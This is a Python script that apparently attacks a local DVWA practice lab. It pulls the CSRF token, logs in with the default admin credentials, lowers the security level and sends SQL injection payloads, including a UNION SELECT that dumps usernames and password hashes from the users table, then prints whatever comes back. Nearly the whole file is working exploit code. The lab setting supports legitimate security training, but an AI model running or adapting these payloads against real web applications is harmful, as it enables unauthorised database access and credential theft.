
import requests
import re

s = requests.Session()

# Step 1: Get login page and extract CSRF token
r = s.get("http://localhost:28080/login.php")
token_match = re.search(r"user_token['\s]*value=['\"]([^'\"]+)", r.text)
token = token_match.group(1)
print(f"[+] CSRF Token: {token}")

# Step 2: Login
r = s.post("http://localhost:28080/login.php", data={
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": token
}, allow_redirects=True)
print(f"[+] Login done, URL: {r.url}")

# Step 3: Set security level via cookie on the right domain
s.cookies.set("security", "low", domain="localhost", path="/")
print(f"[+] Cookies: {dict(s.cookies)}")

# Step 4: First, access the SQLi page to confirm it loads
r = s.get("http://localhost:28080/vulnerabilities/sqli/")
print(f"\n=== SQLi page status: {r.status_code} ===")
# Check if we see the form/input
if "Input an ID" in r.text or "Submit" in r.text:
    print("[+] SQLi page loaded correctly")
else:
    print("[-] SQLi page might be a login redirect")
    print(f"    First 300 chars: {r.text[:300]}")

# Step 5: Try SQLi with various payloads
payloads = [
    ("Basic OR", "' OR '1'='1"),
    ("OR 1=1 --", "' OR 1=1 -- "),
    ("OR 1=1 #", "' OR 1=1 #"),
    ("UNION 2 cols", "' UNION SELECT user,password FROM users #"),
    ("UNION 2 cols --", "' UNION SELECT user,password FROM users -- "),
]

for name, payload in payloads:
    r = s.get("http://localhost:28080/vulnerabilities/sqli/", params={
        "id": payload,
        "Submit": "Submit"
    })
    results = re.findall(r'<td[^>]*>(.*?)</td>', r.text, re.DOTALL)
    errors = re.findall(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
    
    if results:
        print(f"\n[+] {name}: SUCCESS - {len(results)} cells found")
        for i, res in enumerate(results):
            print(f"    [{i}] {res.strip()[:80]}")
    elif errors:
        print(f"\n[-] {name}: ERROR - {errors[0][:100]}")
    else:
        # Check for the vulnerability form response area
        if "First name" in r.text or "Surname" in r.text:
            print(f"\n[?] {name}: Page has form but no results - injection may have failed")
        else:
            print(f"\n[-] {name}: No results, no errors")
            # Print a snippet around "vulnerability"
            idx = r.text.find("vulnerability")
            if idx > 0:
                print(f"    Context: ...{r.text[max(0,idx-50):idx+200]}...")

